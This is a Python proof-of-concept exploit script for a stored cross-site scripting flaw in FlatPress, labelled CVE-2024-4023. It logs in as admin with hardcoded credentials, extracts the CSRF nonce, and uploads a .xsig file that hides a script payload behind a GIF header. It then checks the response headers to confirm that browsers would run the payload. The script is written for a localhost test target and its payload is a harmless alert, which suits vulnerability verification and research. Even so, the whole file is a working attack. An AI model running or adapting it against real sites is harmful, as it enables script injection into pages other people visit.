#!/usr/bin/env python3
import requests
import re
import sys

TARGET_URL = "http://localhost:8081"
USERNAME = "admin"
PASSWORD = "admin123"

class FlatPressXSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def login(self, username, password):
        print(f"[*] Logging in as {username}...")
        login_url = f"{self.target_url}/login.php"
        
        data = {
            "user": username,
            "pass": password,
            "submit": "Login"
        }
        
        resp = self.session.post(login_url, data=data, allow_redirects=True)
        
        admin_resp = self.session.get(f"{self.target_url}/admin.php", allow_redirects=True)
        if "login.php" not in admin_resp.url:
            print("[+] Login successful!")
            return True
        
        print("[-] Login failed!")
        return False
    
    def upload_xss_payload(self):
        print("[*] Uploading XSS payload file (.xsig)...")
        
        uploader_url = f"{self.target_url}/admin.php?p=uploader&action=default"
        resp = self.session.get(uploader_url)
        
        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', resp.text)
        if not nonce_match:
            print("[-] Could not find CSRF token")
            return False
        
        nonce = nonce_match.group(1)
        print(f"[+] Found CSRF token: {nonce}")
        
        xss_content = b'GIF89a=1;<script>alert("XSS-CVE-2024-4023")</script>'
        
        files = {
            'upload[]': ('xss_payload.xsig', xss_content, 'application/octet-stream')
        }
        
        data = {
            '_wpnonce': nonce,
            '_wp_http_referer': '/admin.php?p=uploader&action=default',
            'upload': 'Upload'
        }
        
        resp = self.session.post(uploader_url, files=files, data=data)
        
        if resp.status_code == 200:
            print("[+] File upload request sent!")
            return True
        else:
            print(f"[-] Upload failed: {resp.status_code}")
            return False
    
    def verify_xss(self):
        print("[*] Verifying XSS vulnerability...")
        
        file_url = f"{self.target_url}/fp-content/attachs/xss_payload.xsig"
        resp = self.session.get(file_url)
        
        content_type = resp.headers.get('Content-Type', 'NOT SET')
        nosniff = resp.headers.get('X-Content-Type-Options', 'NOT SET')
        
        print(f"[*] Payload URL: {file_url}")
        print(f"[*] Response Status: {resp.status_code}")
        print(f"[*] Content-Type: {content_type}")
        print(f"[*] X-Content-Type-Options: {nosniff}")
        
        if resp.status_code != 200:
            print(f"[-] File not accessible: {resp.status_code}")
            return False
        
        if 'alert("XSS-CVE-2024-4023")' in resp.text and '<script>' in resp.text:
            print("[+] XSS payload found in response!")
            
            if content_type == 'NOT SET' and nosniff == 'NOT SET':
                print("[+] No Content-Type header - browser will perform MIME sniffing")
                print("[+] No X-Content-Type-Options: nosniff - MIME sniffing not blocked")
                print("[+] Browser may execute JavaScript when accessing this URL!")
                print("[+] XSS VULNERABILITY CONFIRMED!")
                return True
            else:
                print("[!] Headers present but payload accessible")
                return True
        else:
            print("[-] XSS payload not found in response")
            return False
    
    def run(self):
        print("=" * 60)
        print("CVE-2024-4023 - FlatPress Stored XSS Exploit")
        print("Vulnerable Version: FlatPress <= 1.2.1")
        print("=" * 60)
        
        if not self.login(USERNAME, PASSWORD):
            return False
        
        self.upload_xss_payload()
        
        return self.verify_xss()

if __name__ == "__main__":
    exploit = FlatPressXSSExploit(TARGET_URL)
    success = exploit.run()
    
    print("\n" + "=" * 60)
    if success:
        print("RESULT: VULNERABLE - CVE-2024-4023 confirmed")
    else:
        print("RESULT: Could not confirm vulnerability")
    print("=" * 60)
    
    sys.exit(0 if success else 1)
